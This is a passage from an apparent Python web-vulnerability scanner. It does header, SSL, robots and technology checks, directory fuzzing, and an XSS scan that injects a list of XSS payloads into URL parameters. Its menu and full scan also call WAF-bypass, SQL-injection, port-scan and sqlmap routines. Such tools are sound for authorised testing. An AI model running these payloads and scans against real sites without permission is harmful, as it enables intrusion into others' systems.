            if resp.getcode() in [200, 301, 302, 307, 401, 403]:
                content_length = len(resp.read())
                found.append((test_url, resp.getcode(), content_length))
                
                if resp.getcode() == 401:
                    print_warn(f"401 Unauthorized: {test_url} (requires auth)")
                elif resp.getcode() in [301, 302, 307]:
                    print_good(f"Redirect ({resp.getcode()}): {test_url}")
                elif resp.getcode() == 403:
                    print_warn(f"403 Forbidden: {test_url}")
                else:
                    status_color = GREEN if content_length > 100 else YELLOW
                    print(f"  {status_color}[{resp.getcode()}]{NC} {test_url} ({content_length} bytes)")
                    
        except urllib.error.HTTPError as e:
            if e.code in [401, 403]:
                print_warn(f"{e.code} {test_url}")
        except:
            continue
    
    if found:
        print_good(f"Found {len(found)} accessible paths")
    else:
        print_info("No accessible paths found")
    
    return found

# ============================================================
# SSL/TLS CHECK MODULE
# ============================================================

def check_ssl(url):
    print_section(" SSL/TLS Check ")
    
    domain = extract_domain(url)
    port = 443
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                
                print_good(f"SSL/TLS Enabled on {domain}:{port}")
                print_info(f"Protocol: {ssock.version()}")
                print_info(f"Cipher: {cipher[0]} ({cipher[1]} bits)")
                
                # Certificate info
                if cert:
                    subject = dict(x[0] for x in cert['subject'])
                    issuer = dict(x[0] for x in cert['issuer'])
                    print_info(f"Subject: {subject.get('commonName', 'N/A')}")
                    print_info(f"Issuer: {issuer.get('commonName', 'N/A')}")
                    print_info(f"Valid until: {cert.get('notAfter', 'N/A')}")
                    
                    # Check expiration
                    from datetime import datetime as dt2
                    try:
                        expiry = dt2.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_left = (expiry - dt2.now()).days
                        if days_left < 0:
                            print_error(f"Certificate expired {abs(days_left)} days ago!")
                        elif days_left < 30:
                            print_warn(f"Certificate expires in {days_left} days")
                        else:
                            print_good(f"Certificate valid for {days_left} more days")
                    except:
                        pass
                
                # Check for weak ciphers
                if cipher[1] < 128:
                    print_warn(f"Weak cipher strength: {cipher[1]} bits")
                
    except ssl.SSLCertVerificationError as e:
        print_error(f"SSL Certificate verification failed: {str(e)[:60]}")
    except ssl.SSLError as e:
        print_error(f"SSL Error: {str(e)[:60]}")
    except socket.timeout:
        print_warn("Connection timed out")
    except Exception as e:
        print_warn(f"SSL check failed: {str(e)[:60]}")

# ============================================================
# HEADER ANALYSIS MODULE
# ============================================================

def analyze_headers(url):
    print_section(" Header Analysis ")
    
    try:
        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=10)
        headers = dict(resp.headers)
        
        print_info("Response Headers:")
        for k, v in headers.items():
            print(f"  {CYAN}{k}:{NC} {v}")
        
        print()
        
        # Security header checks
        security_headers = {
            "Strict-Transport-Security": "HSTS enabled (protects against SSL stripping)",
            "Content-Security-Policy": "CSP enabled (mitigates XSS)",
            "X-Frame-Options": "Clickjacking protection",
            "X-Content-Type-Options": "MIME-type sniffing protection",
            "X-XSS-Protection": "XSS filter (legacy browsers)",
            "Referrer-Policy": "Referrer leak protection",
            "Permissions-Policy": "Feature permissions control",
            "Access-Control-Allow-Origin": "CORS configured"
        }
        
        print_info("Security Header Analysis:")
        for header, desc in security_headers.items():
            if header.lower() in [h.lower() for h in headers.keys()]:
                actual_value = headers.get(header, headers.get(header.lower(), ""))
                print_good(f"  {header}: {desc} [{actual_value}]")
            else:
                print_warn(f"  {header}: MISSING ({desc})")
        
        # Check for server info disclosure
        if "Server" in headers:
            server = headers["Server"]
            if any(v in server.lower() for v in ["apache", "nginx", "iis", "tomcat"]):
                print_warn(f"Server info disclosed: {server}")
            else:
                print_info(f"Server: {server}")
        
        if "X-Powered-By" in headers:
            print_warn(f"Technology disclosed: X-Powered-By: {headers['X-Powered-By']}")
        
    except Exception as e:
        print_error(f"Header analysis failed: {str(e)[:60]}")

# ============================================================
# ROBOTS & SITEMAP ANALYSIS
# ============================================================

def check_robots_sitemap(url):
    print_section(" Robots & Sitemap Analysis ")
    
    base = f"{url.rstrip('/')}"
    if "?" in url:
        base = url.split("?")[0].rstrip("/")
    
    parsed = urllib.parse.urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    # Check robots.txt
    robots_url = f"{base_url}/robots.txt"
    try:
        req = urllib.request.Request(robots_url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode('utf-8', errors='ignore')
        print_good(f"robots.txt found at {robots_url}")
        print_info("Contents:")
        for line in body.split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                print(f"  {YELLOW}{line}{NC}")
    except:
        print_warn("robots.txt not found")
    
    # Check sitemap.xml
    sitemap_url = f"{base_url}/sitemap.xml"
    try:
        req = urllib.request.Request(sitemap_url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=10)
        print_good(f"sitemap.xml found at {sitemap_url}")
    except:
        print_warn("sitemap.xml not found")

# ============================================================
# TECHNOLOGY DETECTION
# ============================================================

def detect_technologies(url):
    print_section(" Technology Detection ")
    
    techs = []
    
    try:
        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=10)
        headers = dict(resp.headers)
        body = resp.read().decode('utf-8', errors='ignore').lower()
        
        # Server header
        if "Server" in headers:
            server = headers["Server"]
            techs.append(f"Server: {server}")
            print_good(f"Server: {server}")
            
            if "cloudflare" in server.lower():
                techs.append("Cloudflare (CDN/WAF)")
            if "nginx" in server.lower():
                techs.append("Nginx")
            if "apache" in server.lower():
                techs.append("Apache")
            if "iis" in server.lower():
                techs.append("IIS")
            if "openresty" in server.lower():
                techs.append("OpenResty")
        
        # X-Powered-By
        if "X-Powered-By" in headers:
            techs.append(f"Framework: {headers['X-Powered-By']}")
            print_good(f"Framework: {headers['X-Powered-By']}")
        
        # Cookies
        if "Set-Cookie" in headers:
            cookies = headers["Set-Cookie"]
            if "PHPSESSID" in cookies:
                techs.append("PHP")
                print_good("PHP detected")
            elif "JSESSIONID" in cookies:
                techs.append("Java/J2EE")
                print_good("Java/J2EE detected")
            elif "ASP.NET" in cookies or "ASPSESSIONID" in cookies:
                techs.append("ASP.NET")
                print_good("ASP.NET detected")
            elif "laravel_session" in cookies:
                techs.append("Laravel (PHP)")
                print_good("Laravel detected")
            elif "ci_session" in cookies:
                techs.append("CodeIgniter")
                print_good("CodeIgniter detected")
            elif "symfony" in cookies:
                techs.append("Symfony")
                print_good("Symfony detected")
            elif "django" in cookies.lower() or "csrftoken" in cookies:
                techs.append("Django (Python)")
                print_good("Django detected")
            elif "rails" in cookies.lower() or "_session" in cookies.lower():
                techs.append("Ruby on Rails")
                print_good("Ruby on Rails detected")
        
        # Body patterns
        if "wp-content" in body or "wp-includes" in body or "wordpress" in body:
            techs.append("WordPress")
            print_good("WordPress CMS detected")
        if "joomla" in body:
            techs.append("Joomla")
            print_good("Joomla CMS detected")
        if "drupal" in body:
            techs.append("Drupal")
            print_good("Drupal CMS detected")
        if "shopify" in body:
            techs.append("Shopify")
            print_good("Shopify detected")
        if "magento" in body:
            techs.append("Magento")
            print_good("Magento detected")
        if "csrf-token" in body and "csrf" in body:
            techs.append("CSRF Protection Present")
            print_good("CSRF protection detected")
        if "react" in body or "reactjs" in body or "react.js" in body:
            techs.append("React JS")
            print_good("React JS detected")
        if "angular" in body:
            techs.append("Angular")
            print_good("Angular detected")
        if "vue" in body or "vuejs" in body:
            techs.append("Vue.js")
            print_good("Vue.js detected")
        if "jquery" in body:
            techs.append("jQuery")
            print_good("jQuery detected")
        if "bootstrap" in body:
            techs.append("Bootstrap")
            print_good("Bootstrap detected")
        
        if not techs:
            print_info("No specific technologies identified")
        
    except Exception as e:
        print_error(f"Technology detection failed: {str(e)[:60]}")
    
    return techs

# ============================================================
# XSS DETECTION MODULE
# ============================================================

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "\" autofocus onfocus=alert(1) x=\"",
    "';alert(String.fromCharCode(88,83,83));//",
    "\"-alert(1)-\"",
    "';-alert(1)-'",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "1<script>alert(1)</script>",
    "<<SCRIPT>alert(1)</SCRIPT>",
    "<SCRIPT>alert(1);</SCRIPT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>"
]

def xss_scan(url):
    print_section(" XSS Scan ")
    
    if "?" not in url:
        print_warn("No parameters to test for XSS")
        return []
    
    base_url = url.split("?")[0]
    params_part = url.split("?")[1]
    params = params_part.split("&") if params_part else []
    
    vulnerable = []
    
    for param in params:
        key = param.split("=")[0] if "=" in param else param
        print_info(f"Testing parameter: {key}")
        
        for payload in XSS_PAYLOADS:
            test_url = f"{base_url}?{key}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode('utf-8', errors='ignore')
                
                # Check if payload is reflected in response
                if payload.lower().replace("%3C", "<").replace("%3E", ">").replace("%22", "\"") in body:
                    vulnerable.append((key, payload))
                    print_good(f"XSS found in '{key}' with payload: {payload[:40]}")
                    break
                    
            except urllib.error.HTTPError as e:
                if e.code == 200:
                    try:
                        body = e.read().decode('utf-8', errors='ignore')
                        decoded_payload = payload.replace("%3C", "<").replace("%3E", ">").replace("%22", "\"")
                        if decoded_payload.lower() in body.lower():
                            vulnerable.append((key, payload))
                            break
                    except:
                        pass
            except:
                continue
        
        if not any(v[0] == key for v in vulnerable):
            print_info(f"Parameter '{key}' appears not vulnerable to XSS")
    
    if vulnerable:
        print_section(" XSS Results ")
        for v in vulnerable:
            print_good(f"Parameter: {v[0]}, Payload: {v[1]}")
    
    return vulnerable

# ============================================================
# MAIN SCAN FUNCTION
# ============================================================

def run_full_scan(url):
    show_banner()
    print()
    print(f"{GREEN}Target URL: {url}{NC}")
    print(f"{GREEN}Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{NC}")
    print(f"{GREEN}Mode: Full Automatic Scan{NC}")
    print()
    
    # Step 1: Check requirements
    check_install_requirements()
    
    # Step 2: Check if URL is alive
    print_section(" Target Status ")
    status = is_url_alive(url)
    if status:
        print_good(f"Target is alive (HTTP {status})")
    else:
        print_error("Target is not reachable!")
        return
    
    # Step 3: WAF Detection
    waf_result = detect_waf(url)
    
    # Step 4: Technology Detection
    detect_technologies(url)
    
    # Step 5: Header Analysis
    analyze_headers(url)
    
    # Step 6: Robots & Sitemap
    check_robots_sitemap(url)
    
    # Step 7: SSL Check (if HTTPS)
    if url.startswith("https"):
        check_ssl(url)
    
    # Step 8: WAF Bypass (if WAF detected)
    if waf_result:
        waf_bypass_scan(url)
    
    # Step 9: Web Crawling
    crawled_urls = web_crawl(url)
    
    # Step 10: Directory Fuzzing
    fuzz_directories(url)
    
    # Step 11: Column Detection
    max_cols, vuln_params = detect_columns(url)
    
    # Step 12: SQL Injection Scan
    sqli_results = sql_injection_scan(url)
    
    # Step 13: XSS Scan
    xss_results = xss_scan(url)
    
    # Step 14: Port Scanning
    scan_ports(url)
    
    # Step 15: SQLMap Automation
    if "?" in url:
        print_section(" SQLMap Integration ")
        run_sqlmap = input(f"{YELLOW}[?] Run sqlmap automatically? (y/n): {NC}").lower().strip()
        if run_sqlmap == 'y':
            run_sqlmap_automation(url)
    
    # Summary
    print_section(" Scan Summary ")
    print(f"  Target: {url}")
    print(f"  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  WAF Detected: {', '.join(waf_result) if waf_result else 'None'}")
    print(f"  SQL Injection: {len(sqli_results) if sqli_results else 0} vulnerable parameters")
    print(f"  XSS: {len(xss_results) if xss_results else 0} vulnerable parameters")
    print(f"  Columns Found: {max_cols if max_cols else 'N/A'}")
    print(f"  URLs Crawled: {len(crawled_urls)}")
    print()
    print(f"{GREEN}Scan completed successfully!{NC}")

# ============================================================
# INTERACTIVE MENU
# ============================================================

def interactive_menu():
    while True:
        show_banner()
        print(f"{CYAN}Options:{NC}")
        print(f"  {GREEN}[1]{NC} Full Scan (All Modules)")
        print(f"  {GREEN}[2]{NC} WAF Detection Only")
        print(f"  {GREEN}[3]{NC} WAF Bypass Test")
        print(f"  {GREEN}[4]{NC} SQL Injection Scan")
        print(f"  {GREEN}[5]{NC} XSS Scan")
        print(f"  {GREEN}[6]{NC} Column Detection")
        print(f"  {GREEN}[7]{NC} Web Crawling")
        print(f"  {GREEN}[8]{NC} Port Scanning")
        print(f"  {GREEN}[9]{NC} Directory Fuzzing")
        print(f"  {GREEN}[10]{NC} Header Analysis")
        print(f"  {GREEN}[11]{NC} Technology Detection")
        print(f"  {GREEN}[12]{NC} SSL/TLS Check")
        print(f"  {GREEN}[13]{NC} Robots.txt & Sitemap Check")
        print(f"  {GREEN}[14]{NC} SQLMap Automation")
        print(f"  {RED}[0]{NC} Exit")
        print()
        
        choice = input(f"{YELLOW}[?] Select option (0-14): {NC}").strip()
        
        if choice == "0":
            print(f"{GREEN}Exiting...{NC}")
            sys.exit(0)
        
        url = input(f"{YELLOW}[?] Enter target URL (e.g., http://example.com/page.php?id=1): {NC}").strip()
        if not url:
            print_error("URL is required!")
            continue
        
        if not url.startswith("http"):
            url = "http://" + url
        
        show_banner()
        print(f"{GREEN}Target: {url}{NC}\n")
        
        try:
            if choice == "1":
                run_full_scan(url)
            elif choice == "2":
                check_install_requirements()
                detect_waf(url)
            elif choice == "3":
                waf_bypass_scan(url)
            elif choice == "4":
                sql_injection_scan(url)
            elif choice == "5":
                xss_scan(url)
            elif choice == "6":
                detect_columns(url)
            elif choice == "7":
                web_crawl(url)
            elif choice == "8":
                scan_ports(url)
            elif choice == "9":
                fuzz_directories(url)
            elif choice == "10":
                analyze_headers(url)
            elif choice == "11":
                detect_technologies(url)
            elif choice == "12":
                check_ssl(url)
            elif choice == "13":
                check_robots_sitemap(url)
            elif choice == "14":
                run_sqlmap_automation(url)
            else:
                print_error("Invalid option!")
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Scan interrupted by user{NC}")
        except Exception as e:
            print_error(f"Error: {str(e)}")
        
        print(f"\n{YELLOW}Press Enter to continue...{NC}", end="")
        input()

# ============================================================
# MAIN ENTRY POINT
# ============================================================

def main():
    try:
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
        
        if len(sys.argv) > 1:
            url = sys.argv[1]
            if not url.startswith("http"):
                url = "http://" + url
            run_full_scan(url)
        else:
            interactive_menu()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Exiting...{NC}")
        sys.exit(0)
    except Exception as e:
        print_error(f"Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
